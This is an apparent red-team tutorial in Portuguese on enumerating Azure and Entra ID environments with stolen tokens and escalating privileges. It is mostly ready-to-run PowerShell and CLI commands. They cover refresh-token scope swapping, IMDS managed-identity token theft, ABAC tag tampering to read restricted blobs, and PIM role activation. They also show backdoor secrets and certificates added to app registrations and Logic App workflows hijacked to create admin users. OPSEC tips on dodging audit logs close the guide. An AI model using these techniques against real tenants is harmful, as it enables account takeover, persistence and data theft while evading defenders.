---
layout: cyber
section: active-directory
title: "Enumeração Pós-Autenticação e Escalada de Privilégios no Azure"
---

# Enumeração Pós-Autenticação e Escalada de Privilégios no Azure

## Token Válido é Só o Começo

Com token válido (via Device Code, Consent Grant ou qualquer outro vetor), o próximo passo é mapear o ambiente e identificar caminhos pra escalar. No Azure escalada pode significar várias coisas: mover de usuário comum pra Global Admin no Entra ID, mover de sem permissão ARM pra Owner/Contributor em subscription, mover de aplicação com poucas permissões pra uma com `Mail.Read.All`, ou abusar de misconfiguração em roles/grupos/delegações. O ponto de partida é sempre enumeração exaustiva — você precisa entender o que o usuário/SP comprometido vê e faz antes de saber pra onde mover.

---

## Enumeração Pós-Autenticação com Tokens Roubados

### Usando Access Token Diretamente

```powershell
# Conectar Mg Module com access token roubado
$accessToken = "eyJ0..."
Connect-MgGraph -AccessToken (ConvertTo-SecureString $accessToken -AsPlainText -Force)

# Conectar Az CLI com access token
az login --use-device-code  # ou via token injection
# Az CLI não aceita token diretamente, mas pode usar az account get-access-token

# Usar token diretamente via REST (mais flexível)
$headers = @{ Authorization = "Bearer $accessToken" }

# Obter informações do usuário atual
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me" -Headers $headers

# Listar todos os usuários
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users" -Headers $headers
```

### Enumeração Sistemática — O Que Coletar Primeiro

```powershell
# 1. Quem sou eu?
Get-MgContext
Get-MgUser -UserId "me" | Select-Object *

# 2. De quais grupos faço parte?
Get-MgUserMemberOf -UserId "me" -All | Select-Object DisplayName, "@odata.type", Id

# 3. Quais roles Entra ID tenho?
Get-MgUserTransitiveMemberOf -UserId "me" -All | Where-Object "@odata.type" -eq "#microsoft.graph.directoryRole"

# 4. Quais aplicações eu posso ver?
Get-MgApplication -All | Select-Object DisplayName, AppId, Id | Sort-Object DisplayName

# 5. Quais service principals existem?
Get-MgServicePrincipal -All | Select-Object DisplayName, AppId, ServicePrincipalType | Sort-Object DisplayName

# 6. Quais roles do Entra ID estão ativas?
Get-MgDirectoryRole -All | ForEach-Object {
    $role = $_
    $members = Get-MgDirectoryRoleMember -DirectoryRoleId $role.Id -All
    [PSCustomObject]@{
        Role = $role.DisplayName
        Members = ($members | Select-Object -ExpandProperty AdditionalProperties | ForEach-Object { $_["displayName"] }) -join ", "
    }
} | Format-Table -AutoSize

# 7. Conditional Access Policies (requer roles/permissões específicas)
Get-MgIdentityConditionalAccessPolicy -All | Select-Object DisplayName, State, Id

# Alternativa via AAD Graph interno (qualquer usuário autenticado)
$headers = @{ Authorization = "Bearer $accessToken" }
Invoke-RestMethod -Uri "https://graph.windows.net/myorganization/conditionalAccessPolicies?api-version=1.61-internal" -Headers $headers
```

### Enumeração ARM (Azure Resources)

```bash
# Obter token ARM
TOKEN=$(az account get-access-token --resource https://management.azure.com/ --query accessToken -o tsv)

# Listar subscriptions acessíveis
az account list --output table

# Para cada subscription: listar recursos
az resource list --subscription "sub-id" --output table

# Role assignments da subscription
az role assignment list --subscription "sub-id" --all --output table

# Role assignments do usuário atual em todos os escopos
az role assignment list --assignee "user-objectid" --all --include-inherited --output table

# VMs e seu status
az vm list --subscription "sub-id" --output table
az vm list-ip-addresses --subscription "sub-id" --output table

# Storage accounts
az storage account list --output table

# Key Vaults
az keyvault list --output table

# Automation Accounts (podem ter credenciais em runbooks/job outputs)
az automation account list --output table

# Logic Apps
az logic workflow list --output table

# App Services / Function Apps
az webapp list --output table
az functionapp list --output table
```

---

## Técnicas de Escalada de Privilégios

### 1. FOCI — Family Refresh Token Abuse (Troca de Escopo)

Detalhado em `02_acesso_inicial_azure.md`. Em resumo:

```powershell
Import-Module .\TokenTactics.psd1

$rt = "<refresh_token_da_vitima>"
$tid = "<tenant_id>"

# Obter token para MS Graph (para enumeração Entra ID)
Invoke-RefreshToMSGraphToken -RefreshToken $rt -TenantId $tid

# Obter token para ARM (para enumeração de recursos Azure)
Invoke-RefreshToAzureCoreManagementToken -RefreshToken $rt -TenantId $tid

# Obter token para Key Vault
Invoke-RefreshToKeyVaultToken -RefreshToken $rt -TenantId $tid

# Obter token para Teams
Invoke-RefreshToTeamsToken -RefreshToken $rt -TenantId $tid

# Obter token para OneDrive/SharePoint
Invoke-RefreshToSharePointToken -RefreshToken $rt -TenantId $tid -SharePointTenantName "contoso"

# Listar todos os tokens disponíveis
Get-AzureTokens -Tenant $tid
```

### 2. JWT Assertion — Impersonação de Service Principal via Certificado

Se você obteve acesso a um Key Vault que contém o certificado de uma App Registration:

```powershell
# Passo 1: Identificar qual app usa o certificado do Key Vault
# Buscar por thumbprint nos service principals

$certThumbprint = "ABC123..."  # thumbprint do cert no vault

Get-MgApplication -All | ForEach-Object {
    $app = $_
    $app.KeyCredentials | Where-Object { $_.CustomKeyIdentifier -eq [Convert]::FromBase64String($certThumbprint) } |
    ForEach-Object {
        Write-Host "App: $($app.DisplayName) | AppId: $($app.AppId)"
    }
}

# Passo 2: Baixar o certificado do Key Vault (precisa de permissão)
az keyvault certificate download --vault-name "VaultName" --name "CertName" --file cert.pem

# Passo 3: Forjar JWT Assertion e autenticar como a aplicação
# (ver código completo em 02_acesso_inicial_azure.md)
```

### 3. ABAC (Attribute-Based Access Control) — Abuse de Tags em Storage

ABAC extende o RBAC adicionando **condições** baseadas em atributos de recursos (tags em blobs).

**Cenário de Abuso**:
- Principal tem role `Storage Blob Data Reader` com condição: "somente blobs com tag `Project=Cascade`".
- Principal também tem permissão `Microsoft.Storage/storageAccounts/blobServices/containers/blobs/tags/write`.
- Atacante pode **modificar as tags** dos blobs de outros projetos para `Project=Cascade`, ganhando acesso.

```powershell
# Verificar se tem permissão de write em tags
az role assignment list --assignee "sp-objectid" --all | ConvertFrom-Json |
    Select-Object -ExpandProperty properties |
    Select-Object roleDefinitionName, scope

# Verificar permissões da role customizada
az role definition list --custom-role-only true --output table

# Se tem escrita em tags: modificar tag de blob para satisfazer condição
az storage blob tag set \
    --account-name "StorageAccountName" \
    --container-name "ContainerName" \
    --name "confidential-blob.txt" \
    --tags "Project=Cascade" \
    --auth-mode login

# Agora ler o blob que antes era inacessível
az storage blob download \
    --account-name "StorageAccountName" \
    --container-name "ContainerName" \
    --name "confidential-blob.txt" \
    --auth-mode login
```

### 4. PIM (Privileged Identity Management) — Ativação de Roles Elegíveis

PIM permite roles "elegíveis" que um usuário pode ativar sob demanda. Se comprometemos um usuário com role elegível, podemos ativá-la.

```powershell
# Verificar roles elegíveis do usuário atual
Get-MgRoleManagementDirectoryRoleEligibilitySchedule -Filter "principalId eq 'user-objectid'" -All |
    Select-Object RoleDefinitionId, DirectoryScopeId, Status

# Ativar uma role elegível (via Graph API)
$body = @{
    action           = "selfActivate"
    principalId      = "user-objectid"
    roleDefinitionId = "role-definition-id"
    directoryScopeId = "/"
    justification    = "Routine administrative task"
    scheduleInfo     = @{
        startDateTime = (Get-Date).ToUniversalTime().ToString("o")
        expiration    = @{
            type     = "AfterDuration"
            duration = "PT8H"  # 8 horas
        }
    }
} | ConvertTo-Json -Depth 5

Invoke-RestMethod -Method POST `
    -Uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignmentScheduleRequests" `
    -Headers @{ Authorization = "Bearer $graphToken"; "Content-Type" = "application/json" } `
    -Body $body
```

**Abuso PIM com Token Roubado**:
- Se roubamos o access token de um usuário com role elegível PIM.
- O usuário ativa a role (usando MFA no próprio dispositivo).
- O **access token roubado** automaticamente herda os privilégios da role ativada — sem MFA adicional para o atacante!
- Isso ocorre porque o Entra ID atualiza as claims de role no contexto da sessão, e o access token reflete isso na próxima chamada.

### 5. Application Permissions Abuse — SP Overly Permissive

Aplicações com permissões excessivas (como `Mail.ReadWrite.All`, `Directory.ReadWrite.All`) são alvos de alto valor. Ao comprometer um recurso que usa essa aplicação, herda-se as permissões.

```powershell
# Enumerar permissões de application (app roles) de um SP
Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId "sp-id" -All |
    Select-Object ResourceDisplayName, PrincipalDisplayName, CreatedDateTime

# Enumerar delegated permissions (OAuth2PermissionGrants)
Get-MgServicePrincipalOauth2PermissionGrant -ServicePrincipalId "sp-id" -All

# Buscar SPs com permissões críticas
Get-MgServicePrincipal -All | ForEach-Object {
    $sp = $_
    $roles = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $sp.Id -All -ErrorAction SilentlyContinue
    $roles | Where-Object { $_.PrincipalDisplayName -match "Mail|Directory|Files" }
}

# Se comprometemos um recurso (ex: VM) com managed identity associada ao SP:
# 1. Obter token via IMDS
$token = (Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" -Headers @{Metadata="true"}).access_token

# 2. Usar token para acessar dados privilegiados
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users" -Headers @{ Authorization = "Bearer $token" }
```

### 6. Adicionar Secret/Certificado a App Registration

Se o usuário comprometido tem permissão `Application.ReadWrite.All` ou é Owner da aplicação:

```powershell
# Adicionar client secret a uma aplicação existente
$appId = "application-object-id"

$secret = Add-MgApplicationPassword -ApplicationId $appId -PasswordCredential @{
    DisplayName = "BackupKey"
    EndDateTime  = (Get-Date).AddYears(2)
}

Write-Host "Secret criado: $($secret.SecretText)"
# Agora pode autenticar como essa aplicação com o secret

# Alternativamente: adicionar um certificado próprio
$cert = New-SelfSignedCertificate -Subject "CN=BackdoorCert" -KeySpec Signature -NotAfter (Get-Date).AddYears(2)
$certBytes = $cert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Cert)

$keyCredential = @{
    type  = "AsymmetricX509Cert"
    usage = "Verify"
    key   = [Convert]::ToBase64String($certBytes)
}

Update-MgApplication -ApplicationId $appId -KeyCredentials @($keyCredential)
```

### 7. Reset de Senha de Usuário (User Administrator Role)

```powershell
# Se tem role User Administrator ou Helpdesk Administrator
# Pode resetar senha de usuários não-privilegiados

$newPassword = "NewP@ssw0rd!2024"
$userId = "target-user-objectid"

Update-MgUserPassword -UserId $userId -NewPassword $newPassword

# Atenção: User Administrator NÃO pode resetar senha de:
# - Global Administrators
# - Privileged Role Administrators
# - Outros User Administrators
```

### 8. Logic Apps com Managed Identity

Se uma Logic App tem managed identity com permissões elevadas, e você pode modificar o workflow:

```powershell
# Ler o workflow de uma Logic App
az logic workflow show --name "LogicAppName" --resource-group "RG" | ConvertFrom-Json

# Modificar o workflow para executar ações no contexto da managed identity
# (Requer permissão Microsoft.Logic/workflows/write)

$workflowBody = @{
    properties = @{
        definition = @{
            '$schema' = "https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#"
            actions = @{
                # Adicionar ação maliciosa: criar usuário admin, etc.
                "HTTP_Action" = @{
                    type = "Http"
                    inputs = @{
                        method = "POST"
                        uri    = "https://graph.microsoft.com/v1.0/users"
                        # corpo do request para criar usuário admin
                    }
                }
            }
            triggers = @{ ... }
        }
        identity = @{ type = "SystemAssigned" }
    }
} | ConvertTo-Json -Depth 10

Invoke-RestMethod -Method PUT `
    -Uri "https://management.azure.com/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Logic/workflows/LogicAppName?api-version=2019-05-01" `
    -Headers @{ Authorization = "Bearer $armToken"; "Content-Type" = "application/json" } `
    -Body $workflowBody
```

---

## Enumeração de Conditional Access Policies

Saber quais CAPs existem e o que elas protegem é crítico para planejar o bypass:

```powershell
# Via Microsoft Graph (requer roles específicas)
Get-MgIdentityConditionalAccessPolicy -All | ForEach-Object {
    $cap = $_
    Write-Host "=== $($cap.DisplayName) | Estado: $($cap.State) ==="
    Write-Host "  Users incluídos: $($cap.Conditions.Users.IncludeUsers)"
    Write-Host "  Users excluídos: $($cap.Conditions.Users.ExcludeUsers)"
    Write-Host "  Apps: $($cap.Conditions.Applications.IncludeApplications)"
    Write-Host "  Grant: $($cap.GrantControls.BuiltInControls)"
    Write-Host "  Platforms: $($cap.Conditions.Platforms.IncludePlatforms)"
}

# Via AAD Graph interno (qualquer usuário autenticado, mesmo sem roles)
$graphWindowsToken = "<access token para graph.windows.net>"
$headers = @{ Authorization = "Bearer $graphWindowsToken" }
$caps = Invoke-RestMethod `
    -Uri "https://graph.windows.net/myorganization/conditionalAccessPolicies?api-version=1.61-internal" `
    -Headers $headers
$caps.value | Select-Object displayName, state

# Roles que podem ler CAPs:
# - Security Reader
# - Global Reader
# - Security Administrator
# - Conditional Access Administrator
# - Global Administrator
# - App com: Policy.Read.ConditionalAccess, Policy.ReadWrite.ConditionalAccess, Policy.Read.All
```

---

## ROADrecon para Análise Visual

```bash
# Autenticar e coletar tudo
roadrecon auth -u user@domain.com -p 'Password123'
roadrecon gather --mfa

# Com refresh token
roadrecon auth --refresh-token "0.ARo..." --client "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
roadrecon gather

# Interface web (localhost:5000)
roadrecon gui

# Plugins específicos
roadrecon plugin policies   # Analyza CAPs e exporta relatório
roadrecon plugin bloodhound # Exportar no formato BloodHound
```

---

## Detecção e OPSEC

### Logs Gerados Durante Enumeração

| Ação de Enumeração | Log | Severidade Defensiva |
|-------------------|-----|---------------------|
| Get-MgUser -All | Audit Log: "List users" | Baixa |
| Get-MgDirectoryRole | Audit Log: "List directory roles" | Baixa |
| Get-MgIdentityConditionalAccessPolicy | Audit Log | Média |
| Add-MgApplicationPassword | Audit Log: "Add password" | ALTA |
| Ativação PIM | PIM Audit History + Notificação email | ALTA |
| Get via AAD Graph 1.61-internal | Não logado no Audit Log padrão | Nenhuma |

### Minimizando Ruído

1. Use `roadrecon gather` uma vez — faz uma coleta completa e permite análise offline.
2. Prefira leituras em lote (`-All` flag) a queries individuais repetidas.
3. AAD Graph `1.61-internal` para CAPs não gera logs de auditoria — use-o para esse fim.
4. Evite `Update-Mg*` e `New-Mg*` na fase de enumeração — são operações de escrita muito mais visíveis.
5. Ativação de roles PIM **sempre** gera notificação por email para administradores — tenha um plano de ação rápido após ativar.

---

## Módulos Relacionados

`13_azure_acesso_inicial.md` cobre obtenção dos tokens iniciais que alimentam a enumeração. `15_azure_lateral_movement.md` é o próximo passo após escalada. `16_azure_bypass_defesas.md` cobre bypass de CAP pra usar as novas permissões. `18_azure_cheatsheet.md` traz comandos quick-reference.
